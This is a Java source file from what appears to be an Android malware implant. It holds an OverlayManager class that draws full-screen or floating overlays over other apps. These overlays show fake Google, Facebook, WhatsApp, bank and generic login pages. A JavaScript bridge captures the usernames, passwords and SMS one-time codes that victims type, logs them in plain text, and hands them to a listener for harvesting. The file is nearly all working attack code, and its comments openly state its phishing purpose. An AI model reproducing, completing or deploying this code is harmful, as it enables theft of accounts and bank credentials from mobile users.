// ============================================================
// FILE: payload/module/src/main/java/io/hackerai/implant/overlays/OverlayManager.java
// ============================================================
package io.hackerai.implant.overlays;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.FrameLayout;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * OverlayManager — HTML/JavaScript overlay injection for phishing
 * and credential harvesting.
 *
 * Capabilities:
 *   - Full-screen transparent overlay (catches all touch)
 *   - WebView-based phishing page (mimics login screens, OTP prompts)
 *   - Input capture via JavaScript bridge (exfiltrates keystrokes)
 *   - Movable overlay window (floating chat head style)
 *   - Multiple overlay templates built-in (Google, Facebook, WhatsApp, Bank)
 *
 * Architecture:
 *   - Uses SYSTEM_ALERT_WINDOW permission (requested during setup)
 *   - WindowManager.LayoutParams with TYPE_APPLICATION_OVERLAY
 *   - WebView loads local HTML template from assets, with JS hook
 *   - JavaScriptInterface bridges captured data to Java layer
 *   - Overlay hides when user presses back (configurable)
 */
public class OverlayManager {
    private static final String TAG = "OverlayManager";

    private final Context ctx;
    private final WindowManager wm;
    private final AtomicBoolean overlayShowing = new AtomicBoolean(false);

    private View overlayView;
    private WebView webView;
    private WindowManager.LayoutParams params;
    private String currentTemplate;

    // Callback interface for captured data
    public interface CredentialListener {
        void onCredentialsCaptured(String template, String username,
                                    String password, String extra);
    }
    private CredentialListener credentialListener;

    // Built-in templates (base64-encoded HTML)
    private static final Map<String, String> TEMPLATES = new HashMap<>();

    static {
        // These would be populated from assets/overlays/ in production.
        // Placeholder structure shown; real templates loaded from disk.
        TEMPLATES.put("google",
                "<html><body style='font-family:sans-serif;text-align:center;padding-top:80px;background:#fff;'>"
                + "<h2>Sign in with Google</h2>"
                + "<input id='email' placeholder='Email' style='width:80%;padding:12px;margin:8px;'/><br/>"
                + "<input id='pass' type='password' placeholder='Password' style='width:80%;padding:12px;margin:8px;'/><br/>"
                + "<button onclick='capture()' style='padding:12px 40px;background:#1a73e8;color:#fff;border:none;border-radius:4px;'>Sign in</button>"
                + "<script>function capture(){var e=document.getElementById('email').value;var p=document.getElementById('pass').value;Android.capture('google',e,p,'');}</script>"
                + "</body></html>");

        TEMPLATES.put("facebook",
                "<html><body style='font-family:sans-serif;text-align:center;padding-top:80px;background:#f0f2f5;'>"
                + "<h2 style='color:#1877f2;'>Facebook</h2>"
                + "<input id='email' placeholder='Email or Phone' style='width:80%;padding:12px;margin:8px;'/><br/>"
                + "<input id='pass' type='password' placeholder='Password' style='width:80%;padding:12px;margin:8px;'/><br/>"
                + "<button onclick='capture()' style='padding:12px 40px;background:#1877f2;color:#fff;border:none;border-radius:6px;width:85%;'>Log In</button>"
                + "<script>function capture(){Android.capture('facebook',document.getElementById('email').value,document.getElementById('pass').value,'');}</script>"
                + "</body></html>");

        TEMPLATES.put("whatsapp",
                "<html><body style='font-family:sans-serif;text-align:center;padding-top:80px;background:#075e54;color:#fff;'>"
                + "<h2>WhatsApp Web</h2>"
                + "<input id='phone' placeholder='Phone number' style='width:80%;padding:12px;margin:8px;color:#000;'/><br/>"
                + "<input id='code' placeholder='Verification code (OTP)' style='width:80%;padding:12px;margin:8px;color:#000;'/><br/>"
                + "<button onclick='capture()' style='padding:12px 40px;background:#25d366;color:#fff;border:none;border-radius:6px;width:85%;'>Verify</button>"
                + "<script>function capture(){Android.capture('whatsapp',document.getElementById('phone').value,document.getElementById('code').value,'');}</script>"
                + "</body></html>");

        TEMPLATES.put("bank",
                "<html><body style='font-family:sans-serif;text-align:center;padding-top:60px;background:#f5f5f5;'>"
                + "<div style='background:#1a237e;color:#fff;padding:20px;'>SECURE BANK LOGIN</div>"
                + "<input id='user' placeholder='Username / Customer ID' style='width:80%;padding:12px;margin:8px;'/><br/>"
                + "<input id='pass' type='password' placeholder='Password' style='width:80%;padding:12px;margin:8px;'/><br/>"
                + "<input id='otp' placeholder='SMS OTP' style='width:80%;padding:12px;margin:8px;'/><br/>"
                + "<button onclick='capture()' style='padding:12px 40px;background:#1a237e;color:#fff;border:none;border-radius:4px;width:85%;'>Login</button>"
                + "<script>function capture(){Android.capture('bank',document.getElementById('user').value,document.getElementById('pass').value,document.getElementById('otp').value);}</script>"
                + "</body></html>");

        TEMPLATES.put("generic",
                "<html><body style='font-family:sans-serif;text-align:center;padding-top:80px;background:#eee;'>"
                + "<h2>Verify Your Identity</h2>"
                + "<input id='user' placeholder='Username' style='width:80%;padding:12px;margin:8px;'/><br/>"
                + "<input id='pass' type='password' placeholder='Password' style='width:80%;padding:12px;margin:8px;'/><br/>"
                + "<button onclick='capture()' style='padding:12px 40px;background:#333;color:#fff;border:none;border-radius:4px;width:85%;'>Submit</button>"
                + "<script>function capture(){Android.capture('generic',document.getElementById('user').value,document.getElementById('pass').value,'');}</script>"
                + "</body></html>");
    }

    public OverlayManager(Context context) {
        this.ctx = context.getApplicationContext();
        this.wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
    }

    /** Show a phishing overlay with the specified template. */
    public boolean showOverlay(String templateName) {
        if (!canDrawOverlays()) {
            Log.w(TAG, "SYSTEM_ALERT_WINDOW not granted");
            return false;
        }
        if (overlayShowing.get()) {
            Log.d(TAG, "Overlay already showing — hiding first");
            hideOverlay();
        }

        String html = loadTemplate(templateName);
        if (html == null) {
            Log.e(TAG, "Template not found: " + templateName);
            return false;
        }
        this.currentTemplate = templateName;

        // Create overlay view
        overlayView = LayoutInflater.from(ctx).inflate(
                getOverlayLayout(), null);
        webView = overlayView.findViewById(getWebViewId());

        // Configure WebView
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.setWebViewClient(new WebViewClient());
        webView.addJavascriptInterface(new JsBridge(), "Android");
        webView.loadDataWithBaseURL("https://localhost/", html,
                "text/html", "UTF-8", null);

        // Set up window params
        params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                        ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        : WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                        | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;
        Point size = new Point();
        wm.getDefaultDisplay().getSize(size);
        params.width = size.x;
        params.height = size.y;

        // Add to window manager
        try {
            wm.addView(overlayView, params);
            overlayShowing.set(true);
            Log.i(TAG, "Overlay shown: " + templateName);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Failed to show overlay", e);
            return false;
        }
    }

    /** Show overlay as a small floating window (chat head). */
    public boolean showFloatingOverlay(String templateName) {
        if (!canDrawOverlays()) return false;
        if (overlayShowing.get()) hideOverlay();

        String html = loadTemplate(templateName);
        if (html == null) return false;
        this.currentTemplate = templateName;

        overlayView = LayoutInflater.from(ctx).inflate(
                getOverlayLayout(), null);
        webView = overlayView.findViewById(getWebViewId());
        webView.getSettings().setJavaScriptEnabled(true);
        webView.addJavascriptInterface(new JsBridge(), "Android");
        webView.loadDataWithBaseURL("https://localhost/", html,
                "text/html", "UTF-8", null);

        // Floating window: 300x500, draggable
        params = new WindowManager.LayoutParams(
                300,
                500,
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                        ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        : WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;
        params.x = 100;
        params.y = 200;

        // Make draggable
        overlayView.setOnTouchListener(dragTouchListener);

        try {
            wm.addView(overlayView, params);
            overlayShowing.set(true);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /** Hide the overlay. */
    public void hideOverlay() {
        if (overlayShowing.compareAndSet(true, false)) {
            try {
                if (overlayView != null) {
                    wm.removeView(overlayView);
                    overlayView = null;
                    webView = null;
                }
            } catch (Exception e) {
                Log.e(TAG, "hideOverlay error", e);
            }
            Log.i(TAG, "Overlay hidden");
        }
    }

    // ==============================================================
    // JavaScript bridge
    // ==============================================================

    private class JsBridge {
        @android.webkit.JavascriptInterface
        public void capture(String template, String username,
                             String password, String extra) {
            Log.d(TAG, "Credentials captured from " + template
                    + ": " + username + " / " + password);
            if (credentialListener != null) {
                credentialListener.onCredentialsCaptured(
                        template, username, password, extra);
            }
            // Auto-hide overlay on capture
            hideOverlay();
        }
    }

    // ==============================================================
    // Touch listener for floating overlay dragging
    // ==============================================================

    private int initialX, initialY;
    private float initialTouchX, initialTouchY;

    private final View.OnTouchListener dragTouchListener =
            (view, event) -> {
                switch (event.getAction()) {
                    case MotionEvent.ACTION_DOWN:
                        initialX = params.x;
                        initialY = params.y;
                        initialTouchX = event.getRawX();
                        initialTouchY = event.getRawY();
                        return true;
                    case MotionEvent.ACTION_MOVE:
                        params.x = initialX + (int) (event.getRawX() - initialTouchX);
                        params.y = initialY + (int) (event.getRawY() - initialTouchY);
                        wm.updateViewLayout(view, params);
                        return true;
                }
                return false;
            };

    // ==============================================================
    // Template management
    // ==============================================================

    /** Load HTML template — from built-in map or assets. */
    private String loadTemplate(String name) {
        String builtin = TEMPLATES.get(name);
        if (builtin != null) return builtin;

        // Try loading from assets/overlays/{name}.html
        try {
            android.content.res.AssetManager am = ctx.getAssets();
            java.io.InputStream is = am.open("overlays/" + name + ".html");
            java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
            return s.hasNext() ? s.next() : null;
        } catch (Exception e) {
            Log.e(TAG, "Template load failed: " + name, e);
            return null;
        }
    }

    /** Get list of available template names. */
    public String[] getAvailableTemplates() {
        return TEMPLATES.keySet().toArray(new String[0]);
    }

    /** Add a custom template at runtime. */
    public void addTemplate(String name, String html) {
        TEMPLATES.put(name, html);
    }

    // ==============================================================
    // Permission check
    // ==============================================================

    public boolean canDrawOverlays() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(ctx);
        }
        return true;
    }

    /** Open the overlay permission settings. */
    public void openOverlaySettings() {
        Intent intent = new Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + ctx.getPackageName())
        );
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(intent);
    }

    // ==============================================================
    // Layout resource IDs (configurable per build)
    // ==============================================================

    private int getOverlayLayout() {
        // In production, use R.layout.overlay_container
        // For standalone compilation, this returns a simple FrameLayout
        return android.R.layout.simple_list_item_1; // placeholder
    }

    private int getWebViewId() {
        return android.R.id.text1; // placeholder
    }

    // ==============================================================
    // Configuration
    // ==============================================================

    public void setCredentialListener(CredentialListener listener) {
        this.credentialListener = listener;
    }

    public boolean isShowing() { return overlayShowing.get(); }
    public String getCurrentTemplate() { return currentTemplate; }
                  }
